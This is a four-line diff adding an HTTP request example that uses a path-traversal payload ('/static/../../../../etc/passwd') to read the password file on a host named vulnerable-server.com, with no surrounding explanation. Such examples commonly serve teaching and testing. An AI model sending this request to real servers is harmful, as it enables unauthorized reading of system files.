@@ -1,0 +1,4 @@
+```http
+GET /static/../../../../etc/passwd HTTP/1.1
+Host: vulnerable-server.com
+```
